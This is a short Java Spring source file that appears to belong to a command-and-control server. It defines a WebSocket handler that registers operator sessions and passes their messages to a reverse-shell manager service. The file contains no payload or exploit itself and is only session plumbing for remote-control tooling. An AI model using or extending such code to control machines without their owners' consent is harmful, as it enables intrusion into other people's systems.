package com.mtattab.c2cServer.controller;

import com.mtattab.c2cServer.service.impl.ReverseShellManagerObserverServiceImpl;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.TextWebSocketHandler;

@Controller
public class ReverseShellManagerHandler extends TextWebSocketHandler {

    @Autowired
    ReverseShellManagerObserverServiceImpl reverseShellManagerObserverService;


    @Override
    public void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        reverseShellManagerObserverService.addMangerSession(session);

        reverseShellManagerObserverService.handleManagerSession(session, message);
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) throws Exception {
        super.afterConnectionClosed(session, status);
        reverseShellManagerObserverService.removeMangerSession(session);

    }
}
